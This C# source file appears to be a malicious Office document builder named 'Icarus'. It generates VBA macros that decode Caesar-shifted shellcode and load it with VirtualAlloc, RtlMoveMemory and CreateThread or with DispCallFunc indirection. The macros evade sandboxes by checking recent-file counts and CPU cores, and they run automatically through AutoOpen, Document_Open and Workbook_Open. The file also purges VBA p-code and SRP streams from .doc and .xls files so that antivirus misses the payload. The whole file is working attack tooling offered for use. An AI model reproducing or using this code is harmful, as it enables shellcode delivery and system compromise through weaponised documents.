using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using NDesk.Options;
using OpenMcdf;

namespace ShitarusPrivate.Icarus
{
    public class IcarusW
    {
        private static FileStream fs;

        private static string[] s = new string[20];

        private static Random rd = new Random();

        private static string shellcodeexec = "classic";

        private static int caesar = 5;

        public static void Import_Statements(string shellcode)
        {
            if (shellcode == "classic")
            {
                WriteFile("Private Declare PtrSafe Function CreateThread Lib \"KERNEL32\"(ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n");
                WriteFile("Private Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\"(ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n");
                WriteFile("Private Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\"(ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\n");
            }
            else if (shellcode == "indirect")
            {
                WriteFile("Declare PtrSafe Function DispCallFunc Lib \"OleAut32.dll\"(ByVal pvInstance As Long, ByVal offsetinVft As Long, ByVal CallConv As Long, ByVal retTYP As Integer, ByVal paCNT As Long, ByRef paTypes As Integer, ByRef paValues As Long, ByRef retVAR As Variant) As Long\n");
                WriteFile("Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\"(ByVal lpLibFileName As String) As Long\n");
                WriteFile("Declare PtrSafe Function GetProcAddress Lib \"kernel32\"(ByVal hModule As Long, ByVal lpProcName As String) As Long\n");
            }
        }

        public static void Constant(string shellcode)
        {
            if (shellcode == "indirect")
            {
                WriteFile("Const CC_STDCALL = 4\n");
                WriteFile("Const MEM_COMMIT = &H1000\n");
                WriteFile("Const PAGE_EXECUTE_READWRITE = &H40\n");
                WriteFile("Private VType(0 To 63) As Integer, VPtr(0 To 63) As Long\n");
            }
        }

        public static void Malicious(string shellcode)
        {
            if (shellcode == "classic")
            {
                WriteFile("Function " + s[0] + "()\n");
                WriteFile(Declare_variable(s[1], "Variant\n"));
                WriteFile(Declare_variable(s[2], "LongPtr\n"));
                WriteFile(Declare_variable(s[3], "Long\n"));
                WriteFile(Declare_variable(s[4], "Long\n"));
                WriteFile(Declare_variable(s[5], "LongPtr\n"));
            }
            else if (shellcode == "indirect")
            {
                WriteFile("Function " + s[0] + "()\n");
                WriteFile(Declare_variable(s[1], "Long\n"));
                WriteFile(Declare_variable(s[2], "Long\n"));
            }
        }

        public static void FunctionCalls(string shellcode)
        {
            if (shellcode == "classic")
            {
                WriteFile(s[2] + " = VirtualAlloc(0, UBound(" + s[1] + "), &H3000, &H40)\n");
                WriteFile("For " + s[3] + " = LBound(" + s[1] + ") To UBound(" + s[1] + ")\n");
                WriteFile(s[4] + " = " + s[1] + "(" + s[3] + ")\n");
                WriteFile(s[5] + "= RtlMoveMemory(" + s[2] + " + " + s[3] + "," + s[4] + ", 1)\n");
                WriteFile("Next " + s[3] + "\n");
                WriteFile("res = CreateThread(0, 0, " + s[2] + ", 0, 0, 0)\n");
                WriteFile("End Function\n");
            }
            else if (shellcode == "indirect")
            {
                WriteFile(s[1] + " = stdCallA(\"kernel32\", \"VirtualAlloc\", vbLong, 0&, UBound(" + s[3] + "), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n");
                WriteFile("For " + s[4] + " = LBound(" + s[3] + ") To UBound(" + s[3] + ")\n");
                WriteFile(s[5] + " = " + s[3] + "(" + s[4] + ")\n");
                WriteFile(s[2] + " = stdCallA(\"kernel32\", \"RtlMoveMemory\", vbLong, " + s[1] + "+" + s[4] + ", " + s[5] + ", 1)\n");
                WriteFile("Next " + s[4] + "\n");
                WriteFile(s[2] + " = stdCallA(\"kernel32\", \"CreateThread\", vbLong, 0&, 0&, " + s[1] + ", 0&, 0&, 0&)\n");
                WriteFile("End Function\n\n\n");
                WriteFile("Public Function stdCallA(sDll As String, sFunc As String, ByVal RetType As VbVarType, ParamArray P() As Variant)\n");
                WriteFile("Dim i As Long, pFunc As Long, V(), HRes As Long\n");
                WriteFile("ReDim V(0)\n");
                WriteFile("V = P\n");
                WriteFile("For i = 0 To UBound(V)\n");
                WriteFile("If VarType(P(i)) = vbString Then P(i) = StrConv(P(i), vbFromUnicode): V(i) = StrPtr(P(i))\n");
                WriteFile("VType(i) = VarType(V(i))\n");
                WriteFile("VPtr(i) = VarPtr(V(i))\n");
                WriteFile("Next i\n");
                WriteFile("HRes = DispCallFunc(0, GetProcAddress(LoadLibrary(sDll), sFunc), CC_STDCALL, RetType, i, VType(0), VPtr(0), stdCallA)\n");
                WriteFile("End Function\n");
            }
        }

        public static string Declare_variable(string var1, string var2)
        {
            return " Dim " + var1 + " As " + var2;
        }

        public static void WriteFile(string str)
        {
            byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(str);
            fs.Write(bytes, 0, bytes.Length);
        }

        internal static string CreateString(int stringLength)
        {
            char[] array = new char[stringLength];
            for (int i = 0; i < stringLength; i++)
            {
                array[i] = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"[rd.Next(0, 50)];
            }
            return new string(array);
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        public static void Create(string bin, string outfile, int caesar, string document, string _purge)
        {
            string text = bin;
            string text2 = "classic";
            bool flag = false;
            try
            {
                if (_purge.Contains("no"))
                {
                    fs = File.Create(outfile);
                    for (int i = 0; i < 20; i++)
                    {
                        s[i] = CreateString(3);
                    }
                    Import_Statements(shellcodeexec);
                    Constant(shellcodeexec);
                    Malicious(shellcodeexec);
                    Sandboxingdetection(shellcodeexec);
                    Encrypt(File.ReadAllBytes(text), shellcodeexec);
                    Decrypt(shellcodeexec);
                    FunctionCalls(shellcodeexec);
                    if (!(document == "excel"))
                    {
                        if (document == "doc")
                        {
                            Docopen();
                        }
                    }
                    else
                    {
                        Workbookopen();
                    }
                    Auto_open(document);
                    fs.Dispose();
                }
                if (!_purge.Contains("yes"))
                {
                    return;
                }
                try
                {
                    if (!flag)
                    {
                        string outFilename = Utils.GetOutFilename(outfile);
                        if (File.Exists(outFilename))
                        {
                            File.Delete(outFilename);
                        }
                        File.Copy(text, outFilename);
                        text = outFilename;
                    }
                    CompoundFile compoundFile = new CompoundFile(text, CFSUpdateMode.Update, (CFSConfiguration)0);
                    CFStorage cFStorage = compoundFile.RootStorage;
                    if (document == "doc")
                    {
                        cFStorage = compoundFile.RootStorage.GetStorage("Macros");
                    }
                    else if (document == "excel")
                    {
                        cFStorage = compoundFile.RootStorage.GetStorage("_VBA_PROJECT_CUR");
                    }
                    byte[] dirStream = Utils.Decompress(cFStorage.GetStorage("VBA").GetStream("dir").GetData());
                    List<Utils.ModuleInformation> list = Utils.ParseModulesFromDirStream(dirStream);
                    if (flag)
                    {
                        int num = 0;
                        {
                            foreach (Utils.ModuleInformation item in list)
                            {
                                num = num++;
                                Console.WriteLine("\n[+] Module name " + num + ": " + item.moduleName);
                            }
                            return;
                        }
                    }
                    bool flag2 = false;
                    foreach (Utils.ModuleInformation item2 in list)
                    {
                        if (item2.moduleName == text2)
                        {
                            Console.WriteLine("\n[+] Target module name: " + item2.moduleName);
                            byte[] data = cFStorage.GetStorage("VBA").GetStream(item2.moduleName).GetData();
                            string vBATextFromModuleStream = Utils.GetVBATextFromModuleStream(data, item2.textOffset);
                            data = Utils.RemovePcodeInModuleStream(data, item2.textOffset, vBATextFromModuleStream);
                            cFStorage.GetStorage("VBA").GetStream(item2.moduleName).SetData(data);
                            flag2 = true;
                        }
                    }
                    if (!flag2)
                    {
                        Console.WriteLine("\n[!] Cannot find module inside target document (-m).\nList all module streams with (-l).\n");
                        compoundFile.Commit();
                        compoundFile.Close();
                        CompoundFile.ShrinkCompoundFile(text);
                        File.Delete(text);
                        return;
                    }
                    cFStorage.GetStorage("VBA").GetStream("dir").SetData(Utils.Compress(Utils.ChangeOffset(dirStream)));
                    byte[] data2 = Utils.HexToByte("CC-61-FF-FF-00-00-00");
                    cFStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(data2);
                    try
                    {
                        cFStorage.GetStorage("VBA").Delete("__SRP_0");
                        cFStorage.GetStorage("VBA").Delete("__SRP_1");
                        cFStorage.GetStorage("VBA").Delete("__SRP_2");
                        cFStorage.GetStorage("VBA").Delete("__SRP_3");
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("\n[*] No SRP streams found.");
                    }
                    compoundFile.Commit();
                    compoundFile.Close();
                    CompoundFile.ShrinkCompoundFile(text);
                    Console.WriteLine("\n[+] VBA Purging completed successfully!\n");
                }
                catch (FileNotFoundException ex2) when (ex2.Message.Contains("Could not find file"))
                {
                    Console.WriteLine("\n[!] Could not find path or file (-f). \n");
                }
                catch (CFItemNotFound cFItemNotFound) when (cFItemNotFound.Message.Contains("Cannot find item"))
                {
                    Console.WriteLine("\n[!] File (-f) does not match document type selected (-d).\n");
                }
                catch (CFFileFormatException)
                {
                    Console.WriteLine("\n[!] Incorrect filetype (-f). Must be an OLE strucutred file. OfficePurge supports .doc, .xls, or .pub documents.\n");
                }
            }
            catch (Exception ex4)
            {
                Console.Error.WriteLine(ex4.Message);
            }
        }

        public static void Sandboxingdetection(string shellcodeexec)
        {
            if (shellcodeexec == "classic")
            {
                WriteFile(" If Application.RecentFiles.Count < 3 Then\n");
                WriteFile("Exit Function\n");
                WriteFile("End if\n");
                WriteFile("Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n");
                WriteFile("Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Processor\", , 48)\n");
                WriteFile("For Each objItem In colItems\n");
                WriteFile("If objItem.NumberOfCores < 3 Then\n");
                WriteFile("Exit Function\n");
                WriteFile("End If\n");
                WriteFile("Next\n");
            }
        }

        public static void Decrypt(string shellcode)
        {
            if (shellcode == "classic")
            {
                WriteFile("For i = 0 To UBound(" + s[1] + ")\n");
                WriteFile(s[1] + "(i) = " + s[1] + "(i) - " + caesar + "\n");
                WriteFile("Next i\n");
            }
        }

        public static void Docopen()
        {
            WriteFile("Sub Document_Open()\n");
            WriteFile(s[0] + "\n");
            WriteFile("End Sub\n");
        }

        public static void Workbookopen()
        {
            WriteFile("Sub Workbook_Open()\n");
            WriteFile(s[0] + "\n");
            WriteFile("End Sub\n");
        }

        public static void Auto_open(string type)
        {
            if (type == "doc")
            {
                WriteFile("Sub AutoOpen()\n");
                WriteFile(s[0] + "\n");
                WriteFile("End Sub\n");
            }
            else if (type == "excel")
            {
                WriteFile("Sub Auto_Open()\n");
                WriteFile(s[0] + "\n");
                WriteFile("End Sub\n");
            }
        }

        public static void Encrypt(byte[] bytes, string shellcode)
        {
            if (shellcode == "classic")
            {
                StringBuilder stringBuilder = new StringBuilder("");
                uint num = 0u;
                foreach (byte b in bytes)
                {
                    stringBuilder.AppendFormat("{0:D}, ", (long)b + (long)caesar);
                    num++;
                    if (num % 50u == 0)
                    {
                        stringBuilder.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
                string text = stringBuilder.ToString();
                text = ((bytes.Length % 50 != 0) ? text.Substring(0, text.Length - 2) : text.Substring(0, text.Length - 5));
                byte[] bytes2 = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(" " + s[1] + " = Array(" + text + ")\n");
                fs.Write(bytes2, 0, bytes2.Length);
            }
            else
            {
                if (!(shellcode == "indirect"))
                {
                    return;
                }
                StringBuilder stringBuilder2 = new StringBuilder("");
                uint num2 = 0u;
                foreach (byte b2 in bytes)
                {
                    stringBuilder2.AppendFormat("Chr(&H{0:X}), ", (uint)b2);
                    num2++;
                    if (num2 % 30u == 0)
                    {
                        stringBuilder2.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
                string text2 = stringBuilder2.ToString();
                text2 = ((bytes.Length % 30 != 0) ? text2.Substring(0, text2.Length - 2) : text2.Substring(0, text2.Length - 5));
                byte[] bytes3 = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(" " + s[3] + " = Array(" + text2 + ")\n\n");
                fs.Write(bytes3, 0, bytes3.Length);
            }
        }
    }
}
